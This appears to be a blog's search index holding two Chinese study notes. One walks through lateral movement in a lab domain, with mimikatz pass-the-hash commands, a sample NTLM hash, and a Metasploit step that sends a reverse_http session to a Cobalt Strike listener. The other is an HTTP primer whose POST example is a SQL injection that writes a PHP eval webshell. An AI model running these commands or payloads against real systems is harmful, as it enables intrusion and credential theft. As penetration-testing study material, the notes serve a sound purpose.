<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>内网渗透</title>
    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
<p>哈希传递工具 必须借助<code>mimikatz</code></p>
<blockquote>
<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
</blockquote>
<p>通过蚁剑上传到 web目录</p>
<p>在meterpreter中运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>

<p>运行命令 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>

<p>exit 退出</p>
<p>我们直接远程执行 域控服务器上的命令</p>
<p>以下所有的命令是在跳板机上执行。</p>
<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>

<p>执行第二台机器上的命令</p>
<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
<span id="more"></span>

<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>我们打开cs 可以看到主机已经上线</p>
<p>鼠标右键 —会话交互</p>
<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
<p>在最下面 beacon  输入 sleep2  </p>
<p>输入 help查看命令</p>
<p>输入命令 抓取密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>

<p>横向移动：</p>
<p>鼠标右键 网络探测：</p>
<p>这里我们新建一个监听器,这个后面要用</p>
<p>运行完成后要等 几秒</p>
<p>同样的办法横向移动到域控</p>
]]></content>
      <categories>
        <category>内网学习</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>日志注入</tag>
      </tags>
  </entry>
  <entry>
    <title>网络学习</title>
    <url>/2021/12/25/http%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="http的学习"><a href="#http的学习" class="headerlink" title="http的学习"></a>http的学习</h1><h3 id="昨天看了mj老师关于http中请求头中参数的讲解-收获了很多-特此整理成笔记记录-方便以后的复习"><a href="#昨天看了mj老师关于http中请求头中参数的讲解-收获了很多-特此整理成笔记记录-方便以后的复习" class="headerlink" title="昨天看了mj老师关于http中请求头中参数的讲解,收获了很多,特此整理成笔记记录,方便以后的复习."></a>昨天看了mj老师关于http中请求头中参数的讲解,收获了很多,特此整理成笔记记录,方便以后的复习.</h3><h4 id="请求头部分字段"><a href="#请求头部分字段" class="headerlink" title="请求头部分字段"></a>请求头部分字段</h4><table>
<thead>
<tr>
<th align="center">头字段名</th>
<th align="center">说明</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Accept</td>
<td align="center">服务器能够接受的响应文件类型</td>
<td align="center">Accept:text/html</td>
</tr>
<tr>
<td align="center">Accept-Charset</td>
<td align="center">服务器能够接受的字符集</td>
<td align="center">Accept-Charset:GB2312,utf-8:q=0.9,*:q=.0.7</td>
</tr>
<tr>
<td align="center">Accept-Encoding</td>
<td align="center">服务器能够接受的编码方式</td>
<td align="center">Accept-Encoding: gzip, deflate</td>
</tr>
<tr>
<td align="center">Accept-Language</td>
<td align="center">服务器能够接受的语言列表</td>
<td align="center">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</td>
</tr>
<tr>
<td align="center">cookie</td>
<td align="center">之前由服务器通过set-cookie发送的cokkie</td>
<td align="center">security=medium; security_level=0; PHPSESSID=cr1e09stcvf5a2ndbi4skmcde1</td>
</tr>
</tbody></table>
<h5 id="请求包格式讲解"><a href="#请求包格式讲解" class="headerlink" title="请求包格式讲解:"></a>请求包格式讲解:</h5><p>请求行:方法名 对应的url http版本 当然可以通过wireshark抓包查看最原始的请求行.</p>
<p>版本号 url http版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /busuanzi?jsonpCallback=BusuanziCallback_816608165920 HTTP/1.1 </span><br></pre></td></tr></table></figure>

<p>请求头部由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔。请求头部通知服务器有关于客户端请求的信息.</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent：产生请求的浏览器类型。</span><br><span class="line"></span><br><span class="line">Accept：客户端可识别的内容类型列表。</span><br><span class="line"></span><br><span class="line">Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机。</span><br></pre></td></tr></table></figure>

<p>最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头。</p>
<p>请求实体:get请求中不存在请求实体,post请求中请求实体往往保存请求的参数相关内容</p>
<h5 id="优先级讲解"><a href="#优先级讲解" class="headerlink" title="优先级讲解:"></a>优先级讲解:</h5><p>各字段以逗号隔开,每个字段名的值可以有不同类型,实例中p,q参数的值代表优先级(权值),默认为1,值越大优先级越高.例如Accept-Charset:GB2312,utf-8:q=0.9,*:q=.0.7表示GB2312和utf-8的字符优先级为0.9,**代表除了特意指明字符以外的字符集优先级为0.7,通俗的意思就是讲客户端希望优先接收到Charset:GB2312,utf-8的字符集,当然服务器可能会不支持这两种字符,因此会在后面默认这两种字符外的其他字符的优先级.</p>
<h5 id="状态码分类"><a href="#状态码分类" class="headerlink" title="状态码分类"></a>状态码分类</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx	信息，服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx	成功，操作被成功接收并处理</span><br><span class="line">3xx	重定向，需要进一步的操作以完成请求</span><br><span class="line">4xx	客户端错误，请求包含语法错误或无法完成请求</span><br><span class="line">5xx	服务器错误，服务器在处理请求的过程中发生了错误</span><br></pre></td></tr></table></figure>



<h4 id="form表单的两种提交方式"><a href="#form表单的两种提交方式" class="headerlink" title="form表单的两种提交方式"></a>form表单的两种提交方式</h4><p>①是请求方法，HTTP/1.1 定义的请求方法有8种：GET、POST、PUT、DELETE、PATCH、HEAD、OPTIONS、TRACE,这里只介绍常用的两种方法</p>
<h6 id="get请求"><a href="#get请求" class="headerlink" title="get请求:"></a>get请求:</h6><p>参数直接跟在url后面,请求包中并没有请求实体,直接从指定的资源请求数据</p>
<ul>
<li>GET 请求可被缓存</li>
<li>GET 请求保留在浏览器历史记录中</li>
<li>GET 请求可被收藏为书签</li>
<li>GET 请求不应在处理敏感数据时使用</li>
<li>GET 请求有长度限制</li>
<li>GET 请求只应当用于取回数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /service/msn/user?apikey=0QfOX3Vn51YCzitbLaRkTTBadtWpgTN8NZLW0C1SEM&amp;activityId=B827D662-6422-42D6-9141-4FF4DF2AE8C0 //参数直接附在url后面直接请求资源.</span><br></pre></td></tr></table></figure>

<h6 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h6><p><strong>请注意，查询字符串（名称/值对）是在 POST 请求的 HTTP 消息主体中发送的：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /01/vulnerabilities/sqli/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.28</span><br><span class="line"></span><br><span class="line">id=2+union+select+%22%3C%3Fphp+%40eval%28%24_POST%5Bcmd%5D%29%3B+%3F%3E%22+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2F5.php%22%2C2+&amp;Submit=Submit //参数并不直接附在url后面,而是通过请求实体传输参数.</span><br></pre></td></tr></table></figure>

<p><strong>有关 POST 请求的其他一些注释：</strong></p>
<ul>
<li><p>POST 请求不会被缓存</p>
</li>
<li><p>POST 请求不会保留在浏览器历史记录中</p>
</li>
<li><p>POST 不能被收藏为书签</p>
</li>
<li><p>POST 请求对数据长度没有要求</p>
<h4 id="enctype-POST请求时-请求体的编码方式"><a href="#enctype-POST请求时-请求体的编码方式" class="headerlink" title="enctype:POST请求时,请求体的编码方式"></a>enctype:POST请求时,请求体的编码方式</h4><p>通常附在form表单中,默认为application/x-www-form-urlencoded编码,文件类型不支持该编码方式,当用此编码方式时会拒绝接受文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;/cs/login&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>application/x-www-form-urlencoded:请求的参数用&amp;分隔,用=分隔键和值,字符用URL编码方式进行编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<p>multipart/form-data:支持接受文件类型,文件上传必须使用这种编码方式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;/cs/login&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/25/http%E5%AD%A6%E4%B9%A0/1.png" class="" title="这是一张图片">

]]></content>
      <categories>
        <category>计算机网络学习</category>
      </categories>
      <tags>
        <tag>session</tag>
        <tag>form表单</tag>
      </tags>
  </entry>
</search>
